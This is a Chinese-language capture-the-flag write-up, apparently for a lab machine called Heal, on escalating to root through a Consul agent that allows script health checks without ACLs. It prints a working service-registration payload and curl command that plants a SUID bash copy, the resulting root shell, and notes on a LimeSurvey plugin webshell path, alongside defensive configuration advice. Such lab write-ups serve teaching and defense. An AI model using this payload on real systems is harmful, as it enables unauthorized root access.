权限提升 Consul REST API 服务注入 → root

发现 Consul 服务

ps aux | grep consul
root  1862  /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 ...

Consul 以 root 权限运行，监听 127.0.0.1:8500。

检查 Consul 配置

cat /etc/consul.d/config.json
{
  "bootstrap": true,
  "server": true,
  "enable_script_checks": true,
  "acl_default_policy": "allow"
}

两个关键配置：

enable_script_checks: true — 允许服务定义中包含脚本类型的 health check

acl_default_policy: "allow" — 默认允许所有操作，不需要 ACL Token

Consul 是什么？为什么能提权？

Consul 是 HashiCorp 开发的分布式服务网格工具，用于服务发现、健康检查、配置管理和网络分段。

为什么能提权？ Consul Agent 以 root 权限运行，且 enable_script_checks=true 允许通过 API 注册包含 Script 类型 health check 的服务。Health check 脚本由 Consul Agent 执行——也就是以 root 身份执行。攻击者只需通过 REST API 注册一个带恶意脚本的假服务，Consul 就会定期以 root 权限运行该脚本。

与 Ambassador 靶机的区别：Ambassador 需要 ACL Token（从 Git 历史泄露），而 Heal 的 ACL 策略是 allow（默认放行），不需要 Token。

🧒 儿童版：Consul 是公司的"服务登记处"。每个微服务启动后都来这里登记："我是订单服务，地址是 xxx，每 30 秒检查一次我是否活着（运行这个脚本）"。Consul 管理员（root 权限）会乖乖地按你说的定期运行那个"健康检查脚本"。如果你登记了一个假服务，检查脚本写的是"复制一个 root 权限的 bash"，管理员就真的帮你做了。

利用：注册恶意服务

cat > max.json << 'EOF'
{
  "Name": "max service",
  "ID": "rev-shell",
  "Port": 0,
  "Check": {
    "args": ["bash", "-c", "cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash"],
    "interval": "30s",
    "timeout": "5s"
  }
}
EOF
curl -X PUT http://127.0.0.1:8500/v1/agent/service/register \
  -H "Content-Type: application/json" \
  -d @max.json

等待 30 秒（health check interval），Consul 以 root 权限执行了脚本：

-rwsrwsrwx 1 root root 1396520 Sep  6 21:29 rootbash
/tmp/rootbash -p
rootbash-5.1# whoami
root

rootbash-5.1# cat /root/root.txt

⚠️ 踩坑提醒

API 路径穿越需要有效的 JWT Token — 先注册登录获取

LimeSurvey 插件 ZIP 必须包含 config.xml — 否则无法安装

config.xml 中的 <name> 决定了插件目录名 — Webshell 的访问路径是 /upload/plugins/<name>/max.php

Consul 监听 127.0.0.1:8500 — 只能从靶机本地访问（用已有的 shell 执行 curl）

rootbash -p 的 -p 参数是关键 — 它告诉 bash 保留 SUID 的 effective UID，不加的话 bash 会自动降权

额外知识

Consul 安全配置对照

配置项安全值本靶机值影响
enable_script_checksfalsetrue允许通过 API 注册脚本检查 → RCE
acl_default_policydenyallow任何人无需 Token 即可操作 API
运行用户专用低权限用户root脚本以 root 权限执行
监听地址127.0.0.1（仅本地）127.0.0.1需要先获取 shell 才能访问（唯一的安全配置）

正确的防御方式：禁用 enable_script_checks（或改用 enable_local_script_checks 仅允许配置文件定义的检查）；ACL 策略设为 deny；Consul Agent 以非 root 用户运行。

SUID Bash 提权技巧

cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash 创建了一个带 SUID 和 SGID 权限的 bash 副本。运行 /tmp/rootbash -p 时：

-p（privileged）参数告诉 bash 不要丢弃 effective UID。没有 -p 时，bash 会检测 real UID ≠ effective UID，主动将 effective UID 降回 real UID（安全保护机制）。有 -p 时，bash 保留 SUID 设置的 effective UID（root），你就拿到了 root shell。
